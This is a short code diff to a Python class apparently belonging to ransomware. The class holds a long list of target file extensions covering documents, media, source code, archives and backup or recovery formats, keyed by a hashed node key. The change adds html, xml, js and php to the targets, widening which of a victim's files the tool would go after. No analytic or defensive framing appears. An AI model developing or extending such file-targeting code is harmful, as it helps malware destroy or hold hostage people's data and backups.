@@ -43,14 +43,14 @@ node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()
 class Tool:
     def __init__(self):
         self.files_found = []
-        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
-                        "epub", "mp3", "gif", "doc", "odp", "ods", "json",
+        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg", "html",
+                        "epub", "mp3", "gif", "doc", "odp", "ods", "json", "xml",
                         "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
-                        "rb", "java", "pl", "apk", "raw", "eml", "msg", "tmp",
+                        "rb", "java", "pl", "apk", "raw", "eml", "msg", "tmp", "js",
                         "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
                         "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                         "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
-                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala",
+                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala", "php",
                         "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
                         "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
                         "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
